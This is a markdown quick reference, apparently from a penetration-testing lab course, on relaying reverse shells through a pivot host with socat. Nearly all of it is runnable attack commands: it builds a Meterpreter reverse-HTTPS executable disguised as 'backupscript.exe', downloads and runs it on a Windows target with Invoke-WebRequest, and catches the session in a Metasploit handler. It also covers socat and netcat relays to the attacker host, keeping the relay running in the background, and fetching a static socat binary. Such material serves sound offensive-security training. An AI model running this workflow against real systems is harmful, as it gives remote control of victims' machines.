# Socat Redirection Quick Reference

## What is Socat?

**Socat** = Bidirectional relay tool that redirects traffic between two independent network channels

**Use Case**: Redirect reverse shells through a pivot host without SSH tunneling

## Basic Concept

```
Windows Target
    ↓
Connects to Pivot:8080 (Socat listener)
    ↓
Socat redirects to Attack Host:80
    ↓
Metasploit handler receives connection
```

## Simple Socat Redirection

### Syntax
```bash
socat TCP4-LISTEN:LISTEN_PORT,fork TCP4:DESTINATION_IP:DESTINATION_PORT
```

### Example - Redirect Port 8080 to Attack Host
```bash
# On pivot host (Ubuntu)
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

**Explanation**:
- `TCP4-LISTEN:8080` = Listen on port 8080
- `fork` = Create new process for each connection
- `TCP4:10.10.14.18:80` = Forward to attack host port 80

## Complete Attack Workflow

### Step 1: Start Socat on Pivot

```bash
# SSH to pivot
ssh ubuntu@10.129.202.64

# Start socat redirector
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Step 2: Start Handler on Attack Host

```bash
# Start Metasploit
msfconsole

# Configure handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

**Important**: Listen on port 80 (where socat forwards to)

### Step 3: Create Payload

```bash
# Payload connects to pivot (not attack host)
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 \
         LPORT=8080 \
         -f exe \
         -o backupscript.exe
```

**Key Points**:
- `LHOST` = Pivot internal IP (172.16.5.129)
- `LPORT` = Socat listening port (8080)

### Step 4: Transfer Payload to Windows

```bash
# From pivot, start web server
python3 -m http.server 8123

# On Windows
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### Step 5: Execute Payload

```cmd
# On Windows target
C:\backupscript.exe
```

### Step 6: Receive Connection

```
[*] Started HTTPS reverse handler on https://0.0.0.0:80
[*] https://0.0.0.0:80 handling request from 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

## Common Socat Redirections

### HTTP Redirect
```bash
socat TCP4-LISTEN:80,fork TCP4:10.10.14.18:8080
```

### HTTPS Redirect
```bash
socat TCP4-LISTEN:443,fork TCP4:10.10.14.18:443
```

### Multiple Port Redirect (run separately)
```bash
# Terminal 1
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Terminal 2
socat TCP4-LISTEN:4444,fork TCP4:10.10.14.18:4444
```

### SMB Redirect
```bash
socat TCP4-LISTEN:445,fork TCP4:10.10.14.18:445
```

## Socat Options

| Option | Description |
|--------|-------------|
| `TCP4-LISTEN:PORT` | Listen on TCP port |
| `TCP6-LISTEN:PORT` | Listen on IPv6 TCP port |
| `fork` | Create child process per connection |
| `reuseaddr` | Allow port reuse |
| `bind=IP` | Bind to specific IP |

## Advanced Socat Usage

### Bind to Specific Interface
```bash
socat TCP4-LISTEN:8080,fork,bind=172.16.5.129 TCP4:10.10.14.18:80
```

### With Logging
```bash
socat -d -d TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Bidirectional Shell Relay
```bash
socat TCP4-LISTEN:4444,fork TCP4:10.10.14.18:4444,reuseaddr
```

## Network Flow Diagram

```
┌─────────────────┐
│ Windows Target  │
│  172.16.5.19    │
└────────┬────────┘
         │ Payload connects to
         │ 172.16.5.129:8080
         ↓
┌─────────────────┐
│  Pivot (Ubuntu) │
│  172.16.5.129   │
│  10.129.202.64  │
│                 │
│  Socat running: │
│  Listen: 8080   │
│  Forward to ↓   │
└────────┬────────┘
         │ Socat redirects to
         │ 10.10.14.18:80
         ↓
┌─────────────────┐
│  Attack Host    │
│  10.10.14.18    │
│                 │
│  MSF Handler    │
│  Port: 80       │
└─────────────────┘
```

## Complete Example

```bash
# ATTACK HOST (10.10.14.18)
# Terminal 1: Start handler
msfconsole -q -x "use multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set LHOST 0.0.0.0; \
  set LPORT 80; \
  run"

# Terminal 2: Create payload
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=172.16.5.129 LPORT=8080 \
         -f exe -o shell.exe

# Transfer to pivot
scp shell.exe ubuntu@10.129.202.64:~/

# PIVOT HOST (10.129.202.64 / 172.16.5.129)
# Terminal 1: Start socat
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Terminal 2: Host payload
python3 -m http.server 8123

# WINDOWS TARGET (172.16.5.19)
# Download and execute
Invoke-WebRequest -Uri "http://172.16.5.129:8123/shell.exe" -OutFile "C:\shell.exe"
C:\shell.exe

# ATTACK HOST
# Receive Meterpreter session
meterpreter > getuid
```

## Socat vs SSH Tunneling

| Feature | Socat | SSH Tunnel |
|---------|-------|------------|
| **Setup** | Single command | Multiple steps |
| **Encryption** | No (transparent) | Yes |
| **Authentication** | No | Yes (SSH keys/password) |
| **Speed** | Faster | Slightly slower |
| **Stealth** | Less stealthy | More stealthy |
| **Requirements** | Socat binary | SSH access |

## Advantages of Socat

✅ **Pros**:
- Simple one-liner setup
- No SSH required
- Transparent redirection
- Fast performance
- Easy to understand

❌ **Cons**:
- No encryption (traffic visible)
- No authentication
- Less stealthy than SSH
- Single purpose (port redirect)

## Running Socat in Background

```bash
# Background with nohup
nohup socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 &

# Background with screen
screen -dmS socat socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Background with tmux
tmux new -d -s socat 'socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80'
```

## Verification Commands

### Check Socat Running
```bash
# On pivot
ps aux | grep socat
netstat -tlnp | grep 8080
lsof -i :8080
```

### Check Connection
```bash
# On pivot, watch logs
socat -d -d TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# On attack host
netstat -an | grep :80
```

### Test Redirect
```bash
# From another machine
nc -zv 172.16.5.129 8080
telnet 172.16.5.129 8080
```

## Troubleshooting

### Issue 1: Socat Not Found
```bash
# Install socat
sudo apt install socat

# Or download static binary
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmod +x socat
```

### Issue 2: Port Already in Use
```bash
# Check what's using port
lsof -i :8080
netstat -tlnp | grep 8080

# Kill process
kill -9 PID

# Or use different port
socat TCP4-LISTEN:8081,fork TCP4:10.10.14.18:80
```

### Issue 3: Connection Refused
```bash
# Check firewall
sudo iptables -L

# Check socat listening
netstat -tlnp | grep socat

# Verify attack host reachable
ping 10.10.14.18
```

### Issue 4: Permission Denied (Port < 1024)
```bash
# Use sudo for privileged ports
sudo socat TCP4-LISTEN:80,fork TCP4:10.10.14.18:8080

# Or use higher port
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

## Alternative: Netcat Relay

```bash
# If socat not available, use netcat
mkfifo /tmp/pipe
nc -lvnp 8080 < /tmp/pipe | nc 10.10.14.18 80 > /tmp/pipe
```

## Key Points

🔴 **Remember**:
- Payload LHOST = Pivot IP (internal interface)
- Payload LPORT = Socat listening port
- Handler LHOST = 0.0.0.0
- Handler LPORT = Port socat forwards to
- Socat is transparent (no encryption)

🎯 **Port Mapping**:
```
Windows → Pivot:8080 (Socat)
          ↓ redirect
          Attack:80 (Handler)
```

## Quick Commands

```bash
# Install socat
sudo apt install socat

# Start redirector
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Create payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PIVOT_IP LPORT=8080 -f exe -o shell.exe

# Start handler
msfconsole -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 0.0.0.0; set LPORT 80; run"
```

